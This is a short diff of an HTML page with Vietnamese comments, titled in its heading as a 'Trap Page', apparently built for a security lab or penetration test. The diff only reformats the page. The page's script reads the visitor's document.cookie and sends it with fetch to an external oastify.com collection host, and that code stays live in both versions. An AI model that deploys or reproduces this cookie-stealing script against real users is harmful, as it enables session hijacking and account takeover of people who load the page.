@@ -8,8 +8,7 @@
 <script>
     (async function() {
         var userCookies = document.cookie;
-        var destinationURL = 'http://4otqlnlzkuzzujpb580ev4be359wxnlc.oastify.com'; // Sửa đổi theo protocol và port nếu cần
-    
+        var destinationURL = 'http://4otqlnlzkuzzujpb580ev4be359wxnlc.oastify.com'; 
         try {
             // Gửi yêu cầu GET mà không cần quan tâm đến CORS policy
             await fetch(`${destinationURL}?cookies=${encodeURIComponent(userCookies)}`, {
@@ -19,8 +18,8 @@
         } catch (error) {
             console.error('Error:', error);
         }
-    })();
-    </script>
+        })();
+</script>
     
 <body>
     <h1>Chào mừng bạn đến với Trang Bẫy</h1>
